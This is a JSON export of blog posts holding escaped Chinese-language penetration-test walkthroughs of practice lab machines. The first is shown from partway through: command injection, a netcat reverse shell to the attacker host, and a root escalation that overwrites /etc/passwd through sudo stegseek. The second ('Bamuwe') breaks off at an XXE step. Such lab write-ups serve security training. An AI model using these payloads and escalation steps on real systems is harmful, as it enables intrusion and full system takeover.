Injection)\n\n\u6b64\u9636\u6bb5\u5229\u7528 Web \u5e94\u7528\u7684\u6f0f\u6d1e\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u7684 Shell\u3002\n\n### 2.1. \u786e\u8ba4\u6f0f\u6d1e (Confirming Vulnerability)\n\n\u4e3a\u9a8c\u8bc1\u547d\u4ee4\u6ce8\u5165\uff0c\u6211\u4eec\u5728 Web \u8868\u5355\u4e2d\u8f93\u5165\u653b\u51fb\u8005\u7684 IP \u5730\u5740 `192.168.205.128`\uff0c\u5e76\u671f\u671b\u76ee\u6807\u670d\u52a1\u5668\u6267\u884c `ping 192.168.205.128`\u3002\u540c\u65f6\uff0c\u5728\u653b\u51fb\u8005\u673a\u5668\u4e0a\u542f\u52a8 `tcpdump` \u76d1\u542c ICMP \u6d41\u91cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo tcpdump -A -n icmp\n# -A: \u4ee5 ASCII \u6253\u5370\u62a5\u6587\u5185\u5bb9\n# -n: \u4e0d\u89e3\u6790\u4e3b\u673a\u540d\n# icmp: \u53ea\u6355\u83b7 ICMP \u534f\u8bae\u6d41\u91cf\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n```\n\n![](https://7r1umphk.github.io/image/20250411202357686.png)\n\n\u5728 Web \u9875\u9762\u63d0\u4ea4 IP \u540e\uff0c`tcpdump` \u6355\u83b7\u5230\u6765\u81ea\u76ee\u6807 IP \u7684 ICMP \u8bf7\u6c42\uff1a\n\n```bash\n20:23:39.932006 IP 192.168.205.185 > 192.168.205.128: ICMP echo request, id 1016, seq 1, length 64\n# ... (\u5176\u4ed6 ICMP \u8bf7\u6c42\u548c\u54cd\u5e94) ... \n```\n\n\u8fd9\u8bc1\u5b9e\u4e86 Web \u5e94\u7528\u786e\u5b9e\u6267\u884c\u4e86\u7528\u6237\u8f93\u5165\u7684\u547d\u4ee4\uff08\u81f3\u5c11\u662f `ping`\uff09\uff0c\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n### 2.2. \u6f0f\u6d1e\u5229\u7528 (Exploitation - Reverse Shell)\n\n\u5229\u7528\u547d\u4ee4\u6ce8\u5165\u70b9\u6267\u884c\u4e00\u4e2a\u53cd\u5411 Shell Payload\u3002\u4f7f\u7528\u5206\u53f7 `;` \u4f5c\u4e3a\u547d\u4ee4\u5206\u9694\u7b26\uff0c\u5148\u7ed3\u675f\u53ef\u80fd\u5b58\u5728\u7684 `ping` \u547d\u4ee4\uff0c\u7136\u540e\u6267\u884c `netcat` \u547d\u4ee4\u5c06\u76ee\u6807\u670d\u52a1\u5668\u7684 `/bin/bash` Shell \u53cd\u5f39\u56de\u653b\u51fb\u8005\u673a\u5668\u3002\n\n* **Payload:**\n\n  ```\n  ;nc 192.168.205.128 8888 -e /bin/bash\n  ```\n\n  (\u6ce8\u610f\uff1a`;` \u786e\u4fdd `nc` \u547d\u4ee4\u72ec\u7acb\u6267\u884c\u3002`-e /bin/bash` \u6307\u5b9a\u8fde\u63a5\u6210\u529f\u540e\u6267\u884c\u7684\u7a0b\u5e8f\u3002)\n\n* **\u653b\u51fb\u8005\u76d1\u542c:** \u5728 Kali \u4e0a\u4f7f\u7528 `netcat` \u76d1\u542c 8888 \u7aef\u53e3\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n  \u2514\u2500$ nc -lvnp 8888\n  # -l: \u76d1\u542c\u6a21\u5f0f\n  # -v: \u8be6\u7ec6\u8f93\u51fa\n  # -n: \u4e0d\u89e3\u6790\u4e3b\u673a\u540d\n  # -p 8888: \u6307\u5b9a\u76d1\u542c\u7aef\u53e3\n  listening on [any] 8888 ...\n  ```\n\n* **\u83b7\u53d6 Shell:** \u5728 Web \u9875\u9762\u63d0\u4ea4 Payload \u540e\uff0c\u653b\u51fb\u8005\u7684 `nc` \u76d1\u542c\u5668\u63a5\u6536\u5230\u8fde\u63a5\u3002\n\n  ```bash\n  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366\n  # \u6b64\u65f6\u5df2\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668 Shell\uff0c\u7528\u6237\u4e3a www-data\n  ```\n\n  \u6210\u529f\u83b7\u53d6\u4e86\u8fd0\u884c Web \u670d\u52a1\u5668\u7684\u7528\u6237 (`www-data`) \u7684 Shell\u3002\n\n### 2.3. Shell \u5347\u7ea7 (Shell Upgrade)\n\n\u521d\u59cb\u83b7\u5f97\u7684 Shell \u901a\u5e38\u662f\u975e\u4ea4\u4e92\u5f0f\u7684\uff0c\u529f\u80fd\u53d7\u9650\uff08\u5982\u6ca1\u6709 Tab \u8865\u5168\u3001\u65e0\u6cd5\u8fd0\u884c `sudo` \u7b49\uff09\u3002\u9700\u8981\u5347\u7ea7\u4e3a\u529f\u80fd\u5b8c\u6574\u7684 TTY\u3002\n\n```bash\n# \u5728\u76ee\u6807 Shell \u4e2d\u6267\u884c:\n$ script /dev/null -c bash   # \u4f7f\u7528 script \u521b\u5efa\u4e00\u4e2a\u4f2a\u7ec8\u7aef\n# \u6309\u4e0b Ctrl+Z \u5c06\u5176\u7f6e\u4e8e\u540e\u53f0\n\n# \u5728\u653b\u51fb\u8005 Kali \u7ec8\u7aef\u4e2d\u6267\u884c:\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ stty raw -echo; fg      # \u8bbe\u7f6e\u672c\u5730\u7ec8\u7aef\u6a21\u5f0f\uff0c\u5e76\u5c06\u540e\u53f0\u4efb\u52a1\u8c03\u56de\u524d\u53f0\n# \u6309\u4e24\u6b21 Enter \u952e\n\n# \u56de\u5230\u76ee\u6807 Shell \u4e2d\u6267\u884c:\nreset xterm                  # \u91cd\u7f6e\u7ec8\u7aef\u7c7b\u578b\nexport TERM=xterm            # \u8bbe\u7f6e\u7ec8\u7aef\u73af\u5883\u53d8\u91cf\nexport SHELL=/bin/bash       # \u8bbe\u7f6e SHELL \u73af\u5883\u53d8\u91cf\nstty rows 59 cols 236      # (\u53ef\u9009) \u8bbe\u7f6e\u7ec8\u7aef\u5c3a\u5bf8\u4ee5\u5339\u914d\u672c\u5730\u7ec8\u7aef\n```\n\n\u73b0\u5728\u62e5\u6709\u4e86\u4e00\u4e2a\u529f\u80fd\u66f4\u5b8c\u5584\u7684\u4ea4\u4e92\u5f0f Shell\u3002\n\n## 3. \u6743\u9650\u63d0\u5347 (www-data -> welcome)\n\n\u6b64\u9636\u6bb5\u76ee\u6807\u662f\u4ece `www-data` \u7528\u6237\u63d0\u5347\u5230\u6743\u9650\u66f4\u9ad8\u7684\u7528\u6237\u3002\n\n### 3.1. \u4ee5 www-data \u8eab\u4efd\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 (Enumeration as www-data)\n\n* **Web \u76ee\u5f55\u63a2\u7d22:**\n\n  ```bash\n  www-data@AkaRed:/var/www/html$ ls -al\n  total 16\n  # ...\n  -rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt\n  ```\n\n  \u53d1\u73b0 `robots.txt` \u6587\u4ef6\u3002\n\n* **\u68c0\u67e5 `robots.txt`:**\n\n  ```bash\n  www-data@AkaRed:/var/www/html$ cat robots.txt \n  d2VsY29tZTpha2FyZWQ=\n  ```\n\n  \u8fd9\u662f\u4e00\u4e32 Base64 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3002\n\n* **\u89e3\u7801 Base64:**\n\n  ```bash\n  www-data@AkaRed:/var/www/html$ echo 'd2VsY29tZTpha2FyZWQ=' | base64 -d\n  welcome:akared\n  ```\n\n  \u89e3\u7801\u5f97\u5230\u51ed\u636e `welcome:akared`\u3002\u5c1d\u8bd5\u4f7f\u7528\u6b64\u51ed\u636e `su welcome`\uff0c\u4f46\u6839\u636e\u540e\u7eed\u64cd\u4f5c\u5224\u65ad\uff0c\u6b64\u5bc6\u7801 **\u4e0d\u6b63\u786e** \u3002\n\n* **\u68c0\u67e5\u5bb6\u76ee\u5f55:**\n\n  ```bash\n  www-data@AkaRed:/var/www/html$ ls /home/\n  welcome\n  ```\n\n  \u786e\u8ba4\u5b58\u5728\u7528\u6237 `welcome`\u3002\n\n* **\u68c0\u67e5 `/opt` \u76ee\u5f55:**\n\n  ```bash\n  www-data@AkaRed:/opt$ ls -al\n  total 32\n  # ...\n  -rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword\n  ```\n\n  \u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `showmepassword` \u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002\n\n* **\u8fd0\u884c `showmepassword`:**\n\n  ```bash\n  www-data@AkaRed:/opt$ ./showmepassword \n  input to /tmp/xxoo\n  when input 1000 count. u will get password.\n  now it is 1 count.\n  ```\n\n  \u7a0b\u5e8f\u63d0\u793a\u9700\u8981\u8fd0\u884c 1000 \u6b21\u624d\u80fd\u83b7\u5f97\u5bc6\u7801\u3002\n\n* **\u7f16\u5199\u811a\u672c\u8fd0\u884c 1000 \u6b21:**\n\n  ```bash\n  www-data@AkaRed:/opt$ for i in {1..1000}; do ./showmepassword; done\n  # ... (\u5927\u91cf\u8f93\u51fa\u7701\u7565) ...\n  input to /tmp/xxoo\n  when input 1000 count. u will get password.\n  now it is 998 count.\n  input to /tmp/xxoo\n  when input 1000 count. u will get password.\n  d2VsY2  # <-- \u83b7\u53d6\u5230\u5bc6\u7801\u7247\u6bb5\n  input to /tmp/xxoo\n  when input 1000 count. u will get password.\n  d2VsY2\n  input to /tmp/xxoo\n  when input 1000 count. u will get password.\n  d2VsY2\n  ```\n\n  \u5728\u63a5\u8fd1 1000 \u6b21\u65f6\uff0c\u7a0b\u5e8f\u8f93\u51fa\u4e86\u5b57\u7b26\u4e32 `d2VsY2`\u3002\u8fd9\u5f88\u53ef\u80fd\u662f `welcome` \u7528\u6237\u7684\u5bc6\u7801\u3002\n\n### 3.2. \u5207\u6362\u7528\u6237 (Switching User)\n\n\u4f7f\u7528\u4ece `showmepassword` \u83b7\u53d6\u7684\u5bc6\u7801 `d2VsY2` \u5c1d\u8bd5\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n```bash\nwww-data@AkaRed:/opt$ su welcome\nPassword: <\u5728\u6b64\u8f93\u5165 'd2VsY2'>\nwelcome@AkaRed:/opt$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n## 4. \u6743\u9650\u63d0\u5347 (welcome -> root)\n\n\u6b64\u9636\u6bb5\u76ee\u6807\u662f\u4ece `welcome` \u7528\u6237\u63d0\u5347\u5230 `root` \u7528\u6237\u3002\n\n### 4.1. \u4ee5 welcome \u8eab\u4efd\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 (Enumeration as welcome)\n\n\u68c0\u67e5 `welcome` \u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nwelcome@AkaRed:/opt$ sudo -l\nMatching Defaults entries for welcome on AkaRed:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nUser welcome may run the following commands on AkaRed:\n    (ALL : ALL) NOPASSWD: /usr/local/bin/stegseek\n```\n\n\u5173\u952e\u53d1\u73b0\uff1a\u7528\u6237 `welcome` \u53ef\u4ee5 **\u65e0\u9700\u5bc6\u7801** (`NOPASSWD`) \u4ee5 **\u4efb\u4f55\u7528\u6237** (`ALL : ALL`) \u7684\u8eab\u4efd\u8fd0\u884c `/usr/local/bin/stegseek` \u547d\u4ee4\u3002`stegseek` \u662f\u4e00\u4e2a\u7528\u4e8e\u7834\u89e3 `steghide` \u9690\u5199\u5bc6\u7801\u5e76\u63d0\u53d6\u9690\u85cf\u6587\u4ef6\u7684\u5de5\u5177\u3002\u5176 `-xf <outfile>` \u9009\u9879\u5141\u8bb8\u5c06\u63d0\u53d6\u7684\u6587\u4ef6\u5199\u5165\u6307\u5b9a\u8def\u5f84\uff0c\u8fd9\u662f\u4e00\u4e2a\u6f5c\u5728\u7684\u63d0\u6743\u5411\u91cf\u3002\n\n### 4.2. \u5229\u7528\u7b56\u7565 (Exploitation Strategy)\n\n\u5229\u7528 `sudo stegseek` \u7684 `-xf` \u9009\u9879\u8986\u76d6 `/etc/passwd` \u6587\u4ef6\uff0c\u4ece\u800c\u6dfb\u52a0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 root \u7528\u6237\u3002\n\n1.  **\u5728\u653b\u51fb\u8005\u673a\u5668\u4e0a\uff1a**\n    *   \u521b\u5efa\u4e00\u4e2a\u5305\u542b\u81ea\u5b9a\u4e49 root \u7528\u6237\u6761\u76ee\u7684\u6587\u4ef6 (`malicious_passwd`)\u3002\u8be5\u6761\u76ee\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\n    *   \u4f7f\u7528 `steghide` \u5c06\u6b64\u6587\u4ef6\u9690\u85cf\u5230\u4e00\u4e2a\u56fe\u7247 (`1.jpg`) \u4e2d\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2a\u7b80\u5355\u7684\u5bc6\u7801\uff08\u5982 '123456'\uff09\u3002\n    *   \u542f\u52a8 Web \u670d\u52a1\u5668\u4ee5\u6258\u7ba1\u6b64\u56fe\u7247\u3002\n2.  **\u5728\u76ee\u6807\u673a\u5668\u4e0a (\u4ee5 welcome \u7528\u6237\u8eab\u4efd)\uff1a**\n    *   \u4e0b\u8f7d\u5305\u542b\u6076\u610f `passwd` \u6761\u76ee\u7684\u56fe\u7247\u3002\n    *   \u521b\u5efa\u4e00\u4e2a\u5305\u542b `steghide` \u5bc6\u7801 ('123456') \u7684\u6587\u4ef6\u3002\n    *   \u4f7f\u7528 `sudo /usr/local/bin/stegseek <image_file> <password_file> -xf /etc/passwd` \u547d\u4ee4\uff0c\u5f3a\u5236 `stegseek` \u5c06\u9690\u85cf\u7684\u6587\u4ef6\u63d0\u53d6\u5e76\u8986\u76d6\u5230 `/etc/passwd`\u3002\n    *   \u4f7f\u7528\u65b0\u6dfb\u52a0\u7684 root \u7528\u6237\u540d\u548c\u5bf9\u5e94\u5bc6\u7801\u8fdb\u884c `su` \u767b\u5f55\u3002\n\n### 4.3. \u6784\u9020\u5229\u7528\u4ee3\u7801 (Attacker Machine)\n\n1. **\u521b\u5efa\u6076\u610f passwd \u6587\u4ef6 (`malicious_passwd`)**:\n\n   *   \u521b\u5efa\u4e00\u4e2a\u65b0\u7528\u6237 `a`\uff0cUID \u548c GID \u5747\u4e3a 0 (root \u6743\u9650)\u3002\n   *   \u8bbe\u7f6e\u4e00\u4e2a\u5df2\u77e5\u7684\u5bc6\u7801\u54c8\u5e0c\u3002\u8fd9\u91cc\u4f7f\u7528 `$1$user3$rAGRVf5p2jYTqtqOW5cPu/` (\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053\u5176\u5bf9\u5e94\u7684\u660e\u6587\u5bc6\u7801\uff0c\u4f8b\u5982 'pass123')\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n   \u2514\u2500$ echo 'a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash' > malicious_passwd \n   ```\n\n2. **\u51c6\u5907\u8f7d\u4f53\u56fe\u7247 (`1.jpg`)**:\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n   \u2514\u2500$ cp ~/Pictures/1.jpg . # \u590d\u5236\u4e00\u4e2a\u4efb\u610f\u7684 JPG \u56fe\u7247\n   ```\n\n3. **\u4f7f\u7528 `steghide` \u5d4c\u5165\u6570\u636e**:\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n   \u2514\u2500$ steghide embed -ef malicious_passwd -cf 1.jpg -p '123456' \n   # -ef: \u6307\u5b9a\u8981\u5d4c\u5165\u7684\u6587\u4ef6\n   # -cf: \u6307\u5b9a\u8f7d\u4f53\u6587\u4ef6\n   # -p: \u8bbe\u7f6e\u5d4c\u5165/\u63d0\u53d6\u5bc6\u7801\n   embedding 'malicious_passwd' in '1.jpg'... done\n   ```\n\n4. **\u542f\u52a8 HTTP \u670d\u52a1\u5668\u6258\u7ba1\u56fe\u7247**:\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n   \u2514\u2500$ python3 -m http.server 80 # \u5728 80 \u7aef\u53e3\u542f\u52a8\u7b80\u5355 HTTP \u670d\u52a1\u5668                                                                    \n   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n   ```\n\n### 4.4. \u6267\u884c\u5229\u7528\u4ee3\u7801 (Target Machine)\n\n1. **\u5207\u6362\u5230\u53ef\u5199\u76ee\u5f55\u5e76\u4e0b\u8f7d\u56fe\u7247**: `/tmp` \u901a\u5e38\u662f\u6240\u6709\u7528\u6237\u90fd\u53ef\u5199\u7684\u76ee\u5f55\u3002\n\n   ```bash\n   welcome@AkaRed:/opt$ cd /tmp\n   welcome@AkaRed:/tmp$ wget http://192.168.205.128/1.jpg\n   # ... (\u4e0b\u8f7d\u8f93\u51fa) ...\n   2025-04-11 08:29:34 (220 MB/s) - \u20181.jpg\u2019 saved [396237/396237]\n   ```\n\n2. **\u521b\u5efa\u5bc6\u7801\u6587\u4ef6 (`1`)**:\n\n   ```bash\n   welcome@AkaRed:/tmp$ echo '123456' > 1\n   ```\n\n3. **\u6267\u884c `sudo stegseek` \u8986\u76d6 `/etc/passwd`**:\n\n   ```bash\n   welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd\n   # <image_file>: \u8f7d\u4f53\u56fe\u7247\n   # <password_file>: \u5305\u542b\u5bc6\u7801\u7684\u5b57\u5178\u6587\u4ef6\n   # -xf /etc/passwd: \u5c06\u63d0\u53d6\u7684\u6587\u4ef6\u5f3a\u5236\u5199\u5165 /etc/passwd\n   StegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n      \n   [i] Found passphrase: '123456'\n   [i] Original filename: 'malicious_passwd'.\n   [i] Extracting to '/etc/passwd'.\n   the file '/etc/passwd' does already exist. overwrite ? (y/n) \n   y # \u786e\u8ba4\u8986\u76d6\n   ```\n\n4. **\u9a8c\u8bc1 `/etc/passwd` \u5185\u5bb9**:\n\n   ```bash\n   welcome@AkaRed:/tmp$ cat /etc/passwd\n   a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash\n   ```\n\n   \u6587\u4ef6\u5df2\u88ab\u6210\u529f\u4fee\u6539\u4e3a\u53ea\u5305\u542b\u6211\u4eec\u6dfb\u52a0\u7684 `a` \u7528\u6237\u6761\u76ee\u3002\n\n### 4.5. \u83b7\u53d6 Root \u6743\u9650 (Gaining Root Access)\n\n\u4f7f\u7528\u65b0\u6dfb\u52a0\u7684\u7528\u6237 `a` \u548c\u4e4b\u524d\u8bbe\u7f6e\u7684\u5bc6\u7801\uff08\u4f8b\u5982 'pass123'\uff09\u8fdb\u884c\u767b\u5f55\u3002\n\n```bash\nwelcome@AkaRed:/tmp$ su a\nPassword: <\u8f93\u5165 'pass123' \u6216\u5bf9\u5e94\u54c8\u5e0c\u7684\u5bc6\u7801>\na@AkaRed:/tmp# id\nuid=0(a) gid=0(root) groups=0(root)\n```\u6210\u529f\u83b7\u53d6 root \u6743\u9650\u3002\n```\n\n## 5. \u603b\u7ed3 (Conclusion)\n\n\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u6210\u529f\u83b7\u53d6\u4e86 AkaRed \u9776\u673a\u7684 root \u6743\u9650\uff1a\n\n1.  **\u4fe1\u606f\u6536\u96c6:** \u901a\u8fc7 `arp-scan` \u548c `nmap` \u53d1\u73b0\u76ee\u6807 IP \u53ca\u5f00\u653e\u7684 SSH (22) \u548c HTTP (80) \u7aef\u53e3\u3002\n2.  **\u521d\u59cb\u8bbf\u95ee:** \u5229\u7528 Web \u5e94\u7528 'CyberPing 2077' (\u7aef\u53e3 80) \u5b58\u5728\u7684 **\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e**\uff0c\u6267\u884c `netcat` \u53cd\u5411 Shell\uff0c\u83b7\u5f97 `www-data` \u7528\u6237\u6743\u9650\u3002\n3.  **\u7b2c\u4e00\u6b21\u63d0\u6743:** \u5728 `/opt` \u76ee\u5f55\u4e0b\u53d1\u73b0 **\u7279\u6b8a\u7684\u53ef\u6267\u884c\u6587\u4ef6 `showmepassword`**\uff0c\u901a\u8fc7\u811a\u672c\u8fd0\u884c 1000 \u6b21\u83b7\u5f97\u5bc6\u7801 `d2VsY2`\uff0c\u6210\u529f `su` \u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\uff08`robots.txt` \u4e2d\u7684\u51ed\u636e\u5728\u6b64\u8def\u5f84\u65e0\u6548\uff09\u3002\n4.  **\u7b2c\u4e8c\u6b21\u63d0\u6743:** \u53d1\u73b0 `welcome` \u7528\u6237\u62e5\u6709 **\u65e0\u9700\u5bc6\u7801\u5373\u53ef\u901a\u8fc7 `sudo` \u6267\u884c `/usr/local/bin/stegseek`** \u7684\u6743\u9650\u3002\u5229\u7528 `stegseek` \u7684 `-xf` \u9009\u9879\uff0c**\u8986\u76d6 `/etc/passwd` \u6587\u4ef6**\uff0c\u6dfb\u52a0\u4e86\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 root \u7528\u6237 (`a`)\uff0c\u6700\u7ec8\u4f7f\u7528\u8be5\u7528\u6237\u6210\u529f\u767b\u5f55\uff0c\u83b7\u5f97 root \u6743\u9650\u3002sentence", "top": 0, "createdAt": 1751016486, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P10": {"htmlDir": "docs/post/shen-tou-ce-shi-bao-gao- - Bamuwe (-ce-shi-ba-ji-).html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a - Bamuwe (\u6d4b\u8bd5\u9776\u673a)", "postUrl": "post/shen-tou-ce-shi-bao-gao-%20-%20Bamuwe%20%28-ce-shi-ba-ji-%29.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/10", "commentNum": 0, "wordCount": 11529, "description": "## \u6e17\u900f\u6d4b\u8bd5\u62a5\u544a - Bamuwe\n\n## 1. \u7b80\u4ecb\n\n**\u9776\u673a\u540d\u79f0**: Bamuwe(\u672a\u53d1\u5e03\uff0c\u5185\u90e8\u6d4b\u8bd5\u9776\u673a\uff0c\u53ef\u80fd\u540e\u7eed\u53d1\u5e03\u4e8e HackMyVm)\n**\u96be\u5ea6**: \u7b80\u5355\n**\u653b\u51fb\u8005 IP:** `192.168.205.188` (Kali Linux)\n**\u76ee\u6807 IP:** `192.168.205.197` (Bamuwe)\n\n## 2. \u4fe1\u606f\u6536\u96c6 (Enumeration)\n\n### 2.1. \u7f51\u7edc\u53d1\u73b0 (Network Discovery)\n\n\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u63a2\u6d4b\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l           \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n# ... (\u5176\u4ed6\u4e3b\u673a) ...\n192.168.205.197 08:00:27:a0:8d:89       (Unknown) # <-- \u53d1\u73b0\u76ee\u6807\n# ... (\u5176\u4ed6\u4e3b\u673a) ...\n\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.891 seconds (135.38 hosts/sec). 4 responded\n```\n\n\u76ee\u6807\u4e3b\u673a IP \u786e\u5b9a\u4e3a `192.168.205.197`\u3002MAC \u5730\u5740 `08:00:27:a0:8d:89` \n\n### 2.2. \u7aef\u53e3\u626b\u63cf (Port Scanning)\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684 TCP \u7aef\u53e3\u3002\n\n* \u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf (`-p-`) \u786e\u5b9a\u5f00\u653e\u7aef\u53e3\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[~]\n  \u2514\u2500$ nmap -p- 192.168.205.197\n  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 08:20 EDT\n  Nmap scan report for 192.168.205.197\n  Host is up (0.00016s latency).\n  Not shown: 65533 closed tcp ports (reset)\n  PORT   STATE SERVICE\n  22/tcp open  ssh\n  80/tcp open  http\n  MAC Address: 08:00:27:A0:8D:89 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n  \n  Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds\n  ```\n\n  \u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86\u4e24\u4e2a\u5e38\u89c1\u7684\u7aef\u53e3\uff1a`22 (SSH)` \u548c `80 (HTTP)`\u3002\n\n### 2.3. Web \u670d\u52a1\u63a2\u6d4b (Web Enumeration)\n\nWeb \u670d\u52a1\u901a\u5e38\u662f\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\u7684\u7a81\u7834\u53e3\uff0c\u56e0\u6b64\u6211\u9996\u5148\u68c0\u67e5\u4e86 80 \u7aef\u53e3\u7684 HTTP \u670d\u52a1\u3002\u4f7f\u7528 `curl` \u6216\u6d4f\u89c8\u5668\u8bbf\u95ee `http://192.168.205.197`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl http://192.168.205.197                                     \n<!DOCTYPE html>\n    <html>\n    <head>\n        <title>Library Membership Registration</title>\n        <style>\n            body {\n                background: #f0f2f5;\n                font-family: 'Helvetica Neue', Arial, sans-serif;\n                margin: 0;\n                padding: 20px;\n            }\n            .container {\n                max-width: 500px;\n                margin: 40px auto;\n                background: white;\n                padding: 40px;\n                border-radius: 12px;\n                box-shadow: 0 2px 10px rgba(0,0,0,0.1);\n            }\n            h2 {\n                color: #1a73e8;\n                margin-bottom: 30px;\n                text-align: center;\n            }\n            .form-group {\n                margin-bottom: 20px;\n            }\n            label {\n                display: block;\n                margin-bottom: 8px;\n                color: #5f6368;\n                font-weight: 500;\n            }\n            input[type='text'], \n            input[type='password'] {\n                width: 100%;\n                padding: 12px;\n                border: 1px solid #dadce0;\n                border-radius: 6px;\n                font-size: 16px;\n                transition: border-color 0.2s;\n            }\n            input[type='text']:focus, \n            input[type='password']:focus {\n                border-color: #1a73e8;\n                outline: none;\n            }\n            input[type='submit'] {\n                background: #1a73e8;\n                color: white;\n                padding: 14px 24px;\n                border: none;\n                border-radius: 6px;\n                font-size: 16px;\n                cursor: pointer;\n                width: 100%;\n                transition: background 0.2s;\n            }\n            input[type='submit']:hover {\n                background: #1557b0;\n            }\n            .result {\n                padding: 20px;\n                background: #e8f0fe;\n                border-radius: 6px;\n                color: #1967d2;\n                margin-top: 20px;\n            }\n        </style>\n    </head>\n    <body>\n        <div class='container'>\n            <h2>Member Registration</h2>\n            <form method='post'>\n                <div class='form-group'>\n                    <label>Full Name:</label>\n                    <input type='text' name='name'>\n                </div>\n                <div class='form-group'>\n                    <label>Phone Number:</label>\n                    <input type='text' name='tel'>\n                </div>\n                <div class='form-group'>\n                    <label>Email Address:</label>\n                    <input type='text' name='email'>\n                </div>\n                <div class='form-group'>\n                    <label>Password:</label>\n                    <input type='password' name='password'>\n                </div>\n                <input type='submit' value='Register Now'>\n            </form>\n        </div>\n        \n        <!-- XML STRUCTURE EXAMPLE -->\n        <!--\n        <user>\n          <name>John Doe</name>\n          <tel>123-4567890</tel>\n          <email>admin@admin.com</email>\n          <password>secret123</password>\n        </user>\n        -->\n    </body>\n    </html>\n```\n\n\u8fd9\u4e2a XML \u6ce8\u91ca\u5f3a\u70c8\u6697\u793a\u4e86\u540e\u7aef\u53ef\u80fd\u4f7f\u7528 XML \u683c\u5f0f\u6765\u5904\u7406\u7528\u6237\u63d0\u4ea4\u7684\u6ce8\u518c\u4fe1\u606f\u3002\u8fd9\u7acb\u5373\u8ba9\u6211\u6000\u7591\u662f\u5426\u5b58\u5728 **XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165 (XXE)** \u6f0f\u6d1e\u3002\n\n![Web Registration Page](https://7r1umphk.github.io/image/20250430202620701.png)\n\n## 3. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650 (Initial Access - XXE)\n\n### 3.1. \u786e\u8ba4\u6f0f\u6d1e (Confirming Vulnerability)\n\n\u4e3a\u4e86\u9a8c\u8bc1 XXE \u6f0f\u6d1e\uff0c\u6211\u9700\u8981\u6784\u9020\u4e00\u4e2a\u5305\u542b XML \u5916\u90e8\u5b9e\u4f53\u58f0\u660e\u7684 POST \u8bf7\u6c42\u3002\n\n![XXE Payload 